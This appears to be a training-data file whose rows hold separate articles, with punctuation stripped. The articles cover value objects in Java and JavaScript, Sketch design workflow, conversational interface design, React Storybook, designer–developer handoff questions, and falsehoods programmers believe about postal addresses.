functional style   treating everything as immutable values   But if I m not in a functional language  I can still often create value objects  In Java for example  the default point class behaves how I d like   assertEquals new Point 2  3   new Point 2  3       Java  The way this works is that the point class overrides the default equals method with the tests for the values   2   3   I can do something similar in JavaScript   class Point   constructor x  y    this x   x  this y   y    equals  other    return this x     other x    this y     other y       const p1   new Point 2 3   const p2   new Point 2 3   assert p1 equals p2     The problem with JavaScript here is that this equals method I defined is a mystery to any other JavaScript library   const somePoints    new Point 2 3    const p   new Point 2 3   assert isFalse somePoints includes p       not what I want   so I have to do this assert somePoints some i    i equals p      This isn t an issue in Java because Object equals is defined in the core library and all other libraries use it for comparisons      is usually used only for primitives    One of the nice consequences of value objects is that I don t need to care about whether I have a reference to the same object in memory or a different reference with an equal value  However if I m not careful that happy ignorance can lead to a problem  which I ll illustrate with a bit of Java   Date retirementDate   new Date Date parse  Tue 1 Nov 2016        this means we need a retirement party Date partyDate   retirementDate     but that date is a Tuesday  let s party on the weekend partyDate setDate 5   assertEquals new Date Date parse  Sat 5 Nov 2016     retirementDate      oops  now I have to work three more days      This is an example of an Aliasing Bug  I change a date in one place and it has consequences beyond what I expected  4   To avoid aliasing bugs I follow a simple but important rule  value objects should be immutable  If I want to change my party date  I create a new object instead   Date retirementDate   new Date Date parse  Tue 1 Nov 2016     Date partyDate   retirementDate     treat date as immutable partyDate   new Date Date parse  Sat 5 Nov 2016        and I still retire on Tuesday assertEquals new Date Date parse  Tue 1 Nov 2016     retirementDate    Of course  it makes it much easier to treat value objects as immutable if they really are immutable  With objects I can usually do this by simply not providing any setting methods  So my earlier JavaScript class would look like this   5   class Point   constructor x  y    this _data    x  x  y  y     get x    return this _data x   get y    return this _data y   equals  other    return this x     other x    this y     other y       While immutability is my favorite technique to avoid aliasing bugs  it s also possible to avoid them by ensuring assignments always make a copy  Some languages provide this ability  such as structs in C    Whether to treat a concept as a reference object or value object depends on your context  In many situations it s worth treating a postal address as a simple structure of text with value equality  But a more sophisticated mapping system might link postal addresses into a sophisticated hierarchic model where references make more sense  As with most modeling problems  different contexts lead to different solutions   6   It s often a good idea to replace common primitives  such as strings  with appropriate value objects  While I can represent a telephone number as a string  turning into a telephone number object makes variables and parameters more explicit  with type checking when the language supports it   a natural focus for validation  and avoiding inapplicable behaviors  such as doing arithmetic on integer id numbers    Small objects  such as points  monies  or ranges  are good examples of value objects  But larger structures can often be programmed as value objects if they don t have any conceptual identity or don t need share references around a program  This is a more natural fit with functional languages that default to immutability   7   I find that value objects  particularly small ones  are often overlooked   seen as too trivial to be worth thinking about  But once I ve spotted a good set of value objects  I find I can create a rich behavior over them  For taste of this try using a Range class and see how it prevents all sorts of duplicate fiddling with start and end attributes by using richer behaviors  I often run into code bases where domain specific value objects like this can act as a focus for refactoring  leading to a drastic simplification of a system  Such a simplification often surprises people  until they ve seen it a few times   by then it is a good friend   Acknowledgements James Shore  Beth Andres Beck  and Pete Hodgson shared their experiences of using value objects in JavaScript  Graham Brooks  James Birnie  Jeroen Soeters  Mariano Giuffrida  Matteo Vaccari  Ricardo Cavalcanti  and Steven Lowe provided valuable comments on our internal mailing lists   Further Reading Vaughn Vernon s description is probably the best in depth discussion of value objects from a DDD perspective  He covers how to decide between values and entities  implementation tips  and the techniques for persisting value objects  The term started gaining traction in the early noughties  Two books that talk about them from that time are are PoEAA and DDD   There was also some interesting discussion on Ward s Wiki  One source of terminological confusion is that around the turn of the century some J2EE literature used  value object  for Data Transfer Object  That usage has mostly disappeared by now  but you might run into it   Translations  Chinese,"[849 1144 444 1305 1395 400 629 28 820 45 319]"
887,training-dataset/product/518.txt,product,So  you think you can Sketch If you re new to the world of digital design  Sketch is the best tool on the market for screen design  We do a lot of mobile and web design work here at Infinum  and Sketch fits right into our workflow  It s fast but powerful  and you can learn the basics in a few days   Mastering Sketch takes a bit longer  and that s what this article is about  In this piece aimed at veterans and newbies  I ll go over some practices and tips that will make you a better Sketch user   Organizing your Sketch file  If you take anything away from this post  it should be this  Leave no messy files behind  Doing so wastes your developers  precious time  and you ll hate yourself if you have to do some maintenance on your design files a few months down the road   Use pages  Start by dividing your design into pages  Pages live in the left sidebar of Sketch and are hidden by default  Expand the menu to add extra pages   I recommend keeping every major part of the app website in its own page while dedicating a special page for styles   Bonus tip  Create a style page in the wireframing phase  That way you can easily apply style changes across the entire design later on   Name your artboards and layers  Naming your artboards allows you to export them in the exact order you want  It also makes things easier when browsing exported screenshots   I name my artboards in the following format  0X 0Y  X being the page  and Y the position of the artboard on that page    Let s say I m working on the 01  Tasks section of the app  I ll name my artboards like this   For overlay screens  I append a  b  c  etc  to the artboard name   On the other hand  naming your layers will ease up navigation inside your file  The best time to do this is right after you create a layer  I know it s a pain  but you ll thank yourself later   Bonus tip  You can also add a foldername  prefix to your artboard name to automatically create folders when exporting  Shared styles and symbols  Styles and symbols are one of the best things in Sketch  This is where our dedicated page for styles will come in handy  Also  from Sketch 3 7 onwards a page containing all of your symbols is created automatically   Related  Learn how to switch to Sketch  Shared styles  Shared styles are applied to layers  Modifying a style on one layer affects all the layers with the same style applied   Setting up a shared style is straightforward   Select the layer whose properties you want to save as a style Click on  No Shared Style  Select  Create New Shared Style   Don t forget you can make changes to a style without applying them to all layers that share that style  This makes it really easy to try things out without messing up your file  If you like the change  click on the  refresh  icon to apply it to all layers with this style   Symbols  A symbol is technically a group  You ll notice the difference between a symbol and a regular group when trying to modify it  Changing one symbol affects all instances of that symbol  It is similar to styles  but has much greater consequences   Symbols got major upgrades in the Sketch 39 update  It s now possible to resize symbols without affecting other instances of the same symbol  Also  you can define how each layer inside of a symbol or a group behaves when resizing   For now  let s create a symbol out of a group   Select your group Click on  Create Symbol  Click OK  Now you can easily edit your symbol and have changes propagate through all other instances of that symbol   Bonus tip  You can root symbols by using the prefix rootname   when naming them  For instance   button blue and button green  You will be able to access both buttons via 1 symbol   Bounds  Bounds are layers used to standardize dimensions of your design elements  I primarily use them when designing icons and list items   Let s set up some bounds   Create a new style with 0  opacity Fill and name it  Bounds  Create a layer with the desired dimensions and send it to the back of the group Set that layer style to  Bounds   When using bounds in list items  you get perfectly sized groups that are easy to arrange in long lists  If you add bounds to your icons  they will all have same dimensions  This makes things easier for you when exporting and for developers when implementing your design   Shortcuts  You re not a real Sketch master until you hate using the mouse  Shortcuts are the bread and butter of every power user  You ll get more done in less time   Increase decrease layer size   CMD                      That is my absolute favorite shortcut in Sketch  It is used to easily change the size of any layer with your keyboard  Be precise or add  SHIFT and go 10px CRAZY   Copy paste style   CMD    ALT   C V This one might not seem as much  but it can really improve your workflow  It s especially useful when applying styles to a large number of layers   Paste in place   CMD    SHIFT   V This shortcut enables you to paste a layer from your clipboard to the upper left corner of the selected layer   Move layers up or down in the layers list   CMD    ALT            Bonus tip  To move layers to the top or bottom of the layers list just add CTRL    CMD    ALT    CTRL            Bonus tip  Moving to the top won t work if you have Skype open  I don t know why this happens  but I m thinking about leaving Skype behind   Setting up custom shortcuts  So  we ve covered some pretty cool default shortcuts  and I know it s a lot to remember  but now comes the sweet part custom shortcuts  If someone doesn t believe you re a Sketch master  just tell them you ve got custom shortcuts set up   First  let s learn how to set up custom shortcuts   Go to Keyboard    Shortcuts    App Shortcuts Press that     button Select Sketch app Input desired Menu Title Press desired key combination  Now  let me show you a few of my favorite shortcuts   Align items  Before we even start  I must warn you that this will include 6     shortcuts  First  we need some menu items  Find them under Arrange   Align objects   Do the steps we outlined before for  Left    Horizontally    Right    Top    Vertically   and  Bottom  menu items   Key combinations I recommend   CMD    CTRL   1  Left    2  Horizontally    3  Right    4  Top    5  Vertically    6  Bottom   After you ve suffered through all the pain of adding 6     shortcuts  you ll be able to do this   It will take some practice and finger gymnastics  but once you get the hang of it  you won t go back   Round to nearest pixel edge  There is a neat command in Sketch that aligns shapes and layers to the pixel grid  Unfortunately  it doesn t have a keyboard shortcut by default   To set it up as a shortcut  repeat the same steps from above but use  Round to Pixel  as your menu title  For the shortcut  I use   CMD    ALT   K  Plugins  As awesome as Sketch is  third party plugins make it at least 2 times better  Plugins you ll use really depend on what type of a designer you are   Before we get started  there s a tool you will love Sketch Toolbox  It makes finding and managing your plugins a breeze  Download it here   Crystal  While technically not a plugin  it s so important I decided to include it  Crystal is an Android app that enables you to preview your designs live on your device   For all Android users  this is a life saver  It has built in scaling and works over wifi  You can download Crystal here  If you want to send designs to your device via USB as well  you ll have to download the Mac app   Bonus tip  Press CMD   P to quickly send designs to your device   Sketch better Android export  This plugin will save you a lot of time when exporting for Android  No more slicing  setting up scaling factors and suffixes  Just select a group slice layer and this plugin will magically scale your assets and put them in the right folders   Download it here  Note that this plugin works best if you design in 1x  but you are designing in 1x  Right   Bonus tip  You can export to the same folder multiple times and the plugin will merge new files with old ones   Craft  Craft enables you to add real  meaningful data to your designs by inserting real articles or headlines as placeholder text  It s also possible to insert user created image libraries or category specific Unsplash photos as placeholder images  There are also some handy features for duplicating content  Last but not least  you can generate a dedicated style page with all of your colors and fonts  Download it here   Distributor  A small plugin I mostly use on my artboards  Just press   ALT     CTRL   D and choose how you would like to distribute layers artboards   Download it here   Bonus tip  Repeat the last used spacing by pressing  ALT     CTRL   A   Conclusion  We started using Sketch at Infinum after Adobe discontinued Fireworks  At first  we had our doubts  but Sketch s speed  simplicity  and great customer support won us over  Although there are some bugs in the latest versions  Sketch still remains my preferred way to do screen design   And that s it  I hope you ve learned something useful   This article was originally published on the Infinum blog,"[887 1344 564 1077 1175 69 1001 425 599 319 444]"
900,training-dataset/product/1464.txt,product,Designing a conversational interfaceHigh on the list of 2016 s tech buzzwords  conversational  Some heralded this year as  the year of conversational commerce   while others wrote extensively on the power of conversational interfaces  And then there are bots  bots  and more bots  which are  by their very nature  conversational    But as 2016 draws to a close  most things we do are still not that conversational  Yes  you can order an Uber through Facebook Messenger  And Quartz s app brings you the news in conversational format  Not quite the revolution we were promised   In practice  it seems most of these instances of conversational interfaces are gimmicks  more tailored at generating marketing buzz than improving usability for the user  The user experience with these interfaces is often clunky  slow  and less intuitive than a traditional GUI   Related  These 5 major UI mistakes will kill your app  At Saent  we also added a conversational interface to our desktop application this year  We didn t do it to follow the latest trend or garner press mentions  We pursued our conversational UI because we believe it s the best way to fulfill our product s purpose  help our users focus and live more balanced lives   Our product managers  designers  and developers have been working with this UI for over a year now  Some aspects worked out as we expected  others didn t  Below is an overview of the key things we ve learned so far   1  Multiple choice versus open input  Our interface mainly uses multiple choice options and clearly defined input boxes to guide the user   Some of our early design explorations did have a variation with an open text input field   While we love the idea of the open text input field  we opted to provide users with a specific set of multiple choice options  That decision came down to usability and figuring out the best way to use the medium   Open text input fields are like interactive movies in the 90s  The idea sounds great on paper you are in control of what happens and can influence the outcome of the story  yet it overlooks why people want to watch a movie in the first place  to relax and to not have to think  If they want interactive action  they can play a video game  Interactive movies never took off because they re a misuse of the medium   So it is with the open text input field  People already have lots of decisions and choices to make throughout their day  An open input field presents them with another huge challenge  What do I choose to do next  out of all the gazillion options modern work and life have to offer me   We think user interfaces should always simplify choices for the user  not add to their burden  By presenting a few  relevant options  instead of an unlimited choice in the form of an open input field  Saent becomes easier to use rather than creating further decision fatigue  Based on feedback and user numbers  we believe that choice was correct   Smart versus consistent  With the previous idea in mind  presenting our users only with relevant options  we went a step further  What if certain menu options only showed up based on specific parameters   For example  our early beta testers reported Saent s Leaderboard sometimes became a distraction  they couldn t stop checking it  While we were happy to find out the Leaderboard concept actually works  Saent should never be a distraction  we exist to help people focus     Related  The value of consistent design  So we started hiding the Leaderboard option if users had visited it in the past four hours  And we started doing similar things for other options  only show the Take a break button if the user had not taken a break for at least half an hour  Show Categorize  where users marked apps and sites as Good or Evil  only when the user visited a new site  and so on   But it didn t work out well   Our users didn t understand why a certain option would sometimes be shown and not at other times  But even more importantly  with constantly changing buttons  there was no semblance of anything close to a main menu  or  home base     Given that everything we re doing is completely new  the concept of Saent  the hardware element  the conversational interface in the app   we learned this was too much for users to handle  Had we presented a familiar concept  e g   a task management app  in a new way  e g   using a smart and adaptive conversational interface  this might have worked  but in our case it was just too much new stuff all at once  We ve since reverted back to one core interaction that always has the same buttons and resembles a main menu   Personality  Another important reason for us to implement a conversational UI was to give Saent a distinct personality  We ve always thought of Saent as a person a friend who is there by your side to help you do great work   With our original   normal  app UI  this was quite hard to pull off  We did try to put some conversational copy into the app  but it didn t feel authentic   By making our new UI text driven  and basing the layout on the familiar way messaging apps are structured  the  other party  on the left  the user on the right   users really do feel they re in a conversation with Saent at all times  Users are also placed in a running conversation with that app  It doesn t always have to be  push a button and go  the conversational interface gives us the ability to have Saent react to things the user does  which can be deployed to keep people more engaged with the app   It s possible to take this idea too far  as we found see the previous point    Proof that this really works was revealed to us through a bug  At the end of a focus session  Saent either compliments you  in case of a successful session  or motivates you  in case of a failed session   However  in our earliest version  Saent was quite negative after failed sessions and would kind of scold users  Then we shipped a version where a bug gave this negative copy to users who had actually successfully completed their sessions  It didn t take long for complaints to start pouring in  Many users were upset and talked about Saent as if it were a real person who insulted them   Over the past year  we ve experienced many more of such instances indicating the conversational  text based format really is a great way to create personality within your app  It s easy to continually add new copy to keep the conversation fresh  exciting  and surprising  or whatever your brand values are    Development and UX design simplified  Since a conversational UI rests more on its copy than on its visuals  producing new interactions  and sometimes even entire features  is a lot easier than when everything is extremely visual   In our case  we ve developed a set of spreadsheet templates that we use to  design  new interactions and features  As you can see in the below example  the different columns exactly mimic the app   Each sheet represents a different step in the interaction  and buttons contain links to the relevant spreadsheets that represent the options presented by the buttons  This greatly speeds up development of new interactions  as the copywriter can work directly with the software developers  instead of having to wait for a visual designer in between  This frees up designers to spend time tackling more complex UI and UX issues   While we haven t gotten there yet  this idea can be taken one step further  We re planning to translate the spreadsheet format to an in app editor that will allow the copy writer or UX designer to instantly create new interactions using text and predetermined triggers without any need for software development   Taken to its extreme  the user might even be able to add their own interactions at some point  e g   use the editor to have Saent ask you a specific question in the morning  like  Did you brush your teeth   if that s of particular concern to you    This ease of development is also presenting itself in the chatbot world  with the explosion of easy to use chatbot development tools  For app developers  a conversational  text based UI can offer an invaluable level of speed and ease to push out new interactions and features  freeing your development and design teams to tackle larger issues and projects   Ready for the future  AI   translations   As you can see from the previous spreadsheet example  our conversational interface is currently still pretty dumb  It s basically a long string of interconnected multiple choice questions  made slightly less dumb by certain parameters and  If  then   statements   Yet we believe our current conversational interface is the basis for an intelligent future  Without the user having to get used to any new features or interface conventions  we can hook up deep learning and natural language recognition to our interactions at some point in the future  Without changing much on the front end  Saent suddenly can become extremely intelligent in the back end   Closer on the horizon is another practical advantage of the conversational UI  localization  We ve set up the back end database in such a way that we can easily add in translations to other languages  Since it s all copy driven  all we have to do is get a translator to go through all the copy and we can launch a localized version for a new country quickly and easily   Conclusion  A conversational interface isn t for everyone  I personally don t believe it works for news  scrolling and clicking headlines is simply faster   restaurant orders  and other interactions where there are lots of  fixed  options to choose from  and the choice is not too complicated  In such a case  scrolling through a  visual  overview of available options is much more practical  not to mention faster   I m also doubtful about open input fields that present the user with infinite choice  something that sounds great on paper  remember the interactive movie   but in reality most people don t like it  For that reason  and the fact that most of us are not longing for a return to MS DOS  I m also doubtful about chatbots being the future for mainstream users  most folks just don t like to remember  slash  commands   But there are settings for which a conversational interface is a great solution  It s about treating the medium properly and choosing the right UI for your app s goals  In any setting where the user needs advice  assistance  encouragement  or motivation  a conversational interface is great  It provides room for creating a personality  you can take the user by the hand without making it feel condescending  and the interface can be made extremely intelligent based on the input the user is providing   For us it s been a rocky ride getting it right  but overall we re happy with our conversational UI and are continuing on this path  whether or not it ll remain a buzzword in 2017   Want to try out Saent s conversational interface  We re providing exclusive access to the app for InVision Blog readers here,"[900 1395 400 629 28 1132 996 444 1001 248 820]"
996,training-dataset/engineering/717.txt,engineering,Introducing React Storybook   KADIRA VOICEWith React Storybook  you can develop and design UI components outside your app in an isolated environment  It will change how you develop UI components   Before We Begin  These days  backend systems have become very simple thanks to frameworks like Meteor and cloud services like Firebase  Things like GraphQL and Falcor will take backend systems into a new level   So  we spend a lot of time building client side apps rather than working on the backend  React has changed the way we create user interfaces  but we still need to work hard to build great user interfaces  To do so  we write a lot of client side code rather than server side backend code   Just count the NUMBER of LINES you have written for the CLIENT SIDE and you ll see what I mean   Even in the client side app  most of the time we focus on building a few UI components and they usually have nothing to do with the rest of the app  Even when you are implementing new features  a good amount of time is spent on building UI components       Okay  We spend a lot of time building UI components  So  what s your point   That s Hard  Thanks to hot reloading  we can design and iterate UI very quickly  We usually do so within our app   But building a component inside the app is hard  Let me show you the problem   Imagine we are building a todo list component  So  it has a few states and we need to change the UI for them  Here s a list of the states   The list has no items   The list has some items  it s not empty    Few of those items are completed   All the items in the list are completed   Even if we find a way to recreate those states inside the app  we need to document them somehow  Otherwise  a new developer or a designer cannot work on these UI components   I can list a lot of related issues like this  But  I hope you got the point       Yep  That s an issue we face everyday  What we can do about this   Meet React Storybook  We are trying to fix most of the above problems with React Storybook  Using it  you can develop UI components outside your app and allow other people in your team to work on them   Once configured  you can start the React Storybook console by typing   npm run storybook  Then it ll start a webserver on port 9001 and it s looks like this,"[996 444 248 1305 820 200 900 1395 58 329 1267]"
1001,training-dataset/product/940.txt,product,Questions to ask developers before you start designingThis is an excerpt from Designing with your developer in mind  an InVision e course by Kevin Tomasso   In the responsive web design world  constraints can come from a multitude of avenues  from the technologies being used to the browsing habits of your user base  to the skills and strengths of your development team   In this post  we ll go over 4 specific questions you can ask your development team before you fire up your layout software to ensure you re all on the same page   Question 1  How do you prefer the deliverables to be handed over   I always like to get a feel right away for whether the developers are accustomed to a particular handoff procedure  as this may very well determine which layout program you use to create your mockups   Far too many times have I seen a designer  including myself  make assumptions about how the final deliverables should be prepared  only to have to go back and prepare them another way  The last thing your team morale needs when you re done with the design and about to begin development is to go back and re save or redesign files in a different format   Below are a few questions and scenarios to consider and discuss with your development team before you start designing   How should assets be prepared   Do they prefer you slice  prepare and save all assets into an organized folder   Would they rather receive a layered source file that they extract the images from themselves   If this is the case  which type of source file is it  PSD  AI  EPS or layered PDF  Sketch   Do they have the same version of the software  i e  will they be able to open it    How can you group and name the layers to help them find and isolate the assets they need   Do they want you to output HTML from Dreamweaver or another WYSIWYG editor   If this is your normal workflow  ask them if this is optimal for them to work from  9 times out of 10 they probably do not prefer this method   Code generated from graphic interface programs is usually ugly  unorganized  and unusable  In my experience  this method usually slows both the designer and developer down  so avoid code generated from graphic interface programs  It should always be discussed with developers first if you consider it an option   Should the assets be accompanied by a handoff document   How do you plan to document the elements of design that aren t apparent from the mockup  Things like color codes  height width dimensions  fonts  font sizes  spacing  alpha values  hover effects  animations  and other data points must be defined and recorded so that it s not up to the developer to guess and or make assumptions   Some useful applications to aid in this front   Omnigraffle  Makes it easy to draw arrows  add symbols  and other keys to explain the particulars of a design   Avocode  I ve never personally used this  but it allows you to export colors  image assets  fonts  text  CSS  sizes  and dimensions from Photoshop or Sketch  Can eliminate a lot of the headaches discussed earlier   Inspect from InVision  Inspect promises to be another awesome handoff tool with a combination of features available in the products above  particularly useful if you use InVision for prototyping  I personally can t wait to add this to my workflow   Question 2  Will the site be built using a front end framework   There are many popular frameworks available that take a lot of the tedious work out of the design and development process  Knowing which  if any  are being used is paramount to correctly setting up your design document   Many popular frameworks such as Bootstrap and the 960 Grid employ a 12 column system  Why 12 columns  12 is the most easily divisible among reasonably small numbers  You can have 12  6  4  3  2  or one evenly spaced columns  which makes your design decisions a lot easier when you work with these restrictions in mind   With the structure of these frameworks comes pre set dimensions  Know the values of your framework s dimensions from the start global padding  column width  gutter width  and media query breakpoints   I ve had designs break in production because the margins I set on my artboard in Sketch were 5px larger than the margins set in Bootstrap  This is no fun for anyone  as the design has to be reconfigured and then recoded to fix an issue that should have never existed  Learn which framework the site will be built on  and figure out how it translates into an artboard or canvas for your graphic layout software   In addition to grids  many frameworks come with built in design elements like buttons  forms tooltips  etc  If you want to modify or overwrite these predefined styles  and I encourage you to customize them to fit your brand   make sure your developers are aware of this   Almost every time I design a form input with a specific border color  radius  and width  the developers just end up using the framework default because I didn t specify it in my instructions   Don t expect a dev to notice the 2px border radius difference you meticulously chose for your buttons to convey a more friendly feel  They aren t trained to notice such things  but they can follow directions like a machine   Some of the most popular frameworks   Bootstrap  Foundation by Zurb  Pure by Yahoo  Skeleton  Semantic UI   and dozens more  Know which framework your dev prefers before you start designing   Most frameworks have template resources you can easily find and use to set up your Photoshop or Sketch document to match them exactly  This makes everyone s life easier  so use  em   Question 3  What languages and libraries make up the development environment  and what limitations does that create   Even if you don t know how to write code yourself  you can find a good widget or plugin  Code snippets are readily available they make adding functionality to your site a lot more accessible than in decades past  The catch  Plugins aren t one size fits all   If you re going to try and find pre built widgets for the site  that s perfectly fine and often pretty helpful  What you need to do prior  though  is find out what language to search within   Every plugin or widget is written in the specific coding language that the author chose  Many times the language a widget or plugin is written in doesn t match the language or environment your site is being built in  As you can imagine  this causes problems the least of which is a grumpy developer   A weather app built in Ruby won t work if your site runs on PHP  A WordPress slideshow plugin isn t going to do much good on a site built in  NET  An Angular loading bar module will do nothing on a site that uses Backbone js  despite both having roots in Javascript   You get the picture   Even if you find a widget that matches your development environment  use it as an example to explain the desired behavior you re looking for to your team  Your devs may choose to implement it exactly as is  but handing them a ZIP file full of code and asking them to  pop it in  is like having a client email you a series of 100px wide thumbnails and asking you to  create one of those big slideshows   It s presumptuous and can come off a little condescending   Question 4  What browsers do we need to support   Newsflash  All browsers aren t created equal   Okay  you probably knew that  and if you ve ever met a developer  you probably know that Internet Explorer is the bane of their existence   Luckily for the entire design and development community  the browser disparities that haunted online creators in the past are quickly narrowing to a small list of offenders  Even Microsoft has abandoned Internet Explorer and is now shipping their new  standards friendly Edge on all new computers   Knowing the legacy browsers you need to support can significantly alter your design decisions  Here s a list of CSS properties that some legacy browsers cannot support  See if you notice a trend   Border radius  IE8  text shadow  IE8  9  Firefox 2  3  box shadow  IE8  Firefox 2  3  RGBA  color transparency   ie8  Flexbox  more on this later   IE8  9  Needs adjustments for older versions of Safari and Firefox  Multiple backgrounds  IE8  Firefox 2 3 5  SVG  IE8  many others for specific things   CSS Animation  IE8  9  Firefox 2 4  Safari 3 1   3 2  CSS 2D transforms  rotation  scale   IE8  Firefox 2  3  Media Queries  IE8  Firefox 2  3  You can examine all browser functionality here   If you find yourself in a position where you have to support IE8 or extremely old versions of Firefox and Safari  think about how elements will look without the added effects  All your rounded corners will be square  animations will be still  shadows won t be visible  etc   Designing using the newest features but keeping your design usable and attractive in legacy browsers is called progressive enhancement  Just another layer you should be thinking about as you re crafting your masterpieces   Hopefully these questions will help form a clear path of communication with your developers at the outset of a design process  Knowing your constraints ahead of time helps give you a set of  rules  to design with  and setting up correctly will alleviate many  if not most  of the issues that happen between the design and development phase  Measure twice  cut once   Read the next chapter  Learn to work with developers  not against them  in this free e course by Kevin Tomasso and InVision  Sign up here to get the other chapters of this e course delivered straight to your inbox  completely free,"[1001 564 1344 69 319 887 629 400 28 425 1077]"
1077,training-dataset/product/620.txt,product,5 ways to keep your Sketch kitchen cleanDisclaimer  I just ate  so food is on my mind  Roll with me   If you watch The Travel Channel or The Food Network as much as I do  you ll have seen plenty of amazing kitchens from the top restaurants around the world   Something they all have in common  Squeaky clean kitchens   Restaurants like Alinea in Chicago take their cleaning very seriously  and the proof is in their pudding  though I doubt a 3 Michelin star restaurant serves pudding   Here s what someone said regarding the Alinea kitchen cleaning ritual   We cleaned at least 4 times during the 9 to 10 hours that I was there  visiting   Four big all out cleans  and numerous smaller cleans  Add that on to constant line sweeps  and vacuuming every 20 minutes  Everyone s station was spotless  and if it was less than perfect  the chef was sure to sweep over  scold you  and fix it  It was conducive to working clean  having such a clean environment  Everything was shiny  no  kitchen grime  anywhere  All the equipment the coolers  the bottom shelf on the prep table  the bottom of the pots and pans  the bottoms of the hotel pans  the backs of the equipment  the shelves under the line  the windows everything was clean  This was a kitchen in which any surface was clean enough to eat off of   more here   The cleaner your kitchen is  the better your product will be  Here are a couple recommendations for avoiding the  kitchen grime  in your Sketch designs so you stay efficient  and your deliverables stay polished   1  Stick to a baseline grid  I m not gonna tell you to use any particular size  just as long as you stick to it  I personally prefer an 8px baseline grid because it plays nicely with various typographic standards and has more divisors  1  2  4  8px versus 1  5  10px   but I know 10px baseline grids are popular since all design applications ship with Shift   as 10px  So use whatever floats your tugboat  You can use Nudg it to change the default Shift   distance to save yourself time  This does wonders when you re designing in a style like Google Material Design that works off of an 8px grid   Sticking to a grid will make spacing components a breeze and it ll ensure perfect visual rhythm  It removes guesswork when spacing out components  because distances must be multiples of your baseline grid value  As a bonus  your developers will love you because they ll likely be working with a layout framework that adheres to a grid system   2  Use bounding boxes  Once you ve set your baseline grid  it s incredibly useful to use bounding boxes to keep objects on your artboard organized and spaced consistently  In the image below  I use bounding boxes for each tab item  and I don t actually have to put any space between the tab groups  The spacing is built into the bounding box  so each tab is snug against the one next to it   Using a plugin like Ken Moore s Relabel Button will allow you to create evenly spaced tabs like this in seconds   Additionally  objects with bounding boxes have larger click areas and allow you to use things like inner shadows as dividers or highlighters  Which brings us to   3  Never use lines for dividers  While we re on the topic of click area sizes  can we talk about how difficult it is to grab a line segment   It s like Sketch is saying  We know there are 2 million pixels on the screen  but you need to click just this one  Not that one  nope  the  nope  almos  nailed i  nope    Secondly  even if you select the Fit to Pixel option in Sketch preferences  drag resizing a line will always put it on sub pixels  Super aggravating  and it ll really mess up your spacing elsewhere because the ruler will round up values for any object that sits on sub pixels   So what should you do instead  I recommend using inner shadows to draw lines  Draw a rectangle and give it an inner shadow like so   Why is this better  You now have a much larger click area  you re protected from the dreaded sub pixel  and  most importantly  you can use it as a style  Imagine you re creating a list of items and you want a line separating each item  Instead of a bunch of text plus a line  now you can set your bounding box and give it an inner shadow  How cool is that    Note  Until Sketch supports borders with controllable sides  I ve found inner shadows to be the best method for things like this   4  Organize your styles and symbols  This one is easy  Did you know you can create style and symbol submenus in Sketch  By putting slashes in your style and symbol names  you can create an organized  folder  structure for finding things later   5  Name your layers all of them  Select an object on your artboard and learn this hotkey sequence   Command Shift J  Command R  Got it  It should select the layer in your layers list  then highlight the layer name to allow you to change it   Pro tip  Use the Tab key to jump to the next layer in your layers list to rename that one  too  I recommend this plugin by Rodrigo Soares to rename multiple layers at once  find and replace  and rename with sequencing   In the screenshot above  you ll see that I ve called the  Jason Burke  layer  Name   Why  Well  because that s what it is  By default  Sketch names the layer to whatever the text is inside of it  but seeing  Jason Burke  in a list of potentially hundreds of layers isn t particularly useful for me   So what  It s not a huge deal  Not really  no  But where it becomes exceptionally useful is when you can do things like this   Confession  I used to never use the Search function to find layers  but once I started naming layers semantically to describe what the content was and not what the content said  then I realized the power of searching layers   One last thing  Clean as you go  When you finish designing that list item  rename it  Group it  If you re feeling wild  symbolize it  Tiny amounts of work along the way will save you a ton of time in the long run   No one likes cleaning a tower of dirty dishes after spending an hour cooking dinner  so do yourself a favor and clean as you go   Happy Sketching     Many of the images used in this post were taken directly from the UX Power Tools that we ve been meticulously designing with these  and other  techniques in mind  Check it out here   This post was originally published on Medium,"[1077 887 1344 1175 564 425 69 1001 599 444 319]"
1127,training-dataset/engineering/246.txt,engineering,Falsehoods programmers believe about addressesPerhaps you ve read posts like Falsehoods Programmers Believe About Names and Falsehoods programmers believe about time  Maybe you ve also read Falsehoods programmers believe about geography   Addressing is a fertile ground for incorrect assumptions  because everyone s used to dealing with addresses and 99  of the time they seem so simple  Below are some incorrect assumptions I ve seen made  or made myself  or had reported to me   If you want to look up an address for a UK postcode or vice versa to confirm what I m telling you  try the Royal Mail Postcode Finder   An address will start with  or at least include  a building number  Counterexample  Royal Opera House  Covent Garden  London  WC2E 9DD  United Kingdom   When there is a building number  it will be all numeric  Counterexample  1A Egmont Road  Middlesbrough  TS4 2HT 4 5 Bonhill Street  London  EC2A 4BX  No buildings are numbered zero Counterexample  0 Egmont Road  Middlesbrough  TS4 2HT  Well  at the very least no buildings have negative numbers Guy Chisholm provided this counterexample  Minusone Priory Road  Newbury  RG14 7QS  none of the databases I ve checked render this as  1   We can put those funny numbers into the building name field  as no buildings have both a name and a funny number Counterexample  Idas Court  4 6 Princes Road  Hull  HU5 2RD  When there s a building name  there won t be a building number  or vice versa  Counterexample  Flat 1 4  Ziggurat Building  60 66 Saffron Hill  London  EC1N 8QX  United Kingdom  A building number will only be used once per street The difference between 50 Ammanford Road  Tycroes  Ammanford  SA18 3QJ and 50 Ammanford Road  Llandybie  Ammanford  SA18 3YF is about 4 miles  Google Maps    When there s line with a number in an address  it s the building number  Counterexample  Flat 18  Da Vinci House  44 Saffron Hill  London  EC1N 8FH  United Kingdom You also get suite numbers  floor numbers  unit numbers  and organisations with numbers in their names  Adrien Pi rard contributes an address from Japan with fifteen digits in six separate numbers  five if you count the zip code as a single number   The format is  980 0804  zip code   Miyagi ken  prefecture  Sendai shi  city  Aoba ku  ward  Kokubuncho  district  4 10 20  sub district number block number lot number  Sendai  building name  401  flat number    OK  the first line starting with a number then Counterexample  3 Store  311 318 High Holborn  London  WC1V 7BN  A building will only have one number Benton Lam offers this address from the Hong Kong Special Administrative Region   it has both a number on its road  14  and in its group of buildings  3   15 F  Cityplaza 3  14 TaiKoo Wan Road  Island East  HKSAR  The number of buildings is the difference between the highest and lowest building numbers Tibor Sch tz points out building numbers may be skipped   for example  on a street where even numbered buildings are on one side  odd numbers on the other  multiple buildings sharing the same number  such as where a new house has been built  and buildings with more than one number  Cyrille Ch p lov and Sami Lehtinen tell me in Antibes  France and rural Finland some buildings are numbered based on the distance from the start of the road   such as Longroad 65 for the building 750m from the start of longroad   If the addresses on the left of the road are even  the addresses on the right must be odd Cyrille Ch p lov points out that in places  Boulevard Th ophile Sueur  Montreuil  Seine Saint Denis  France has evens only on both sides  The two sides are also in 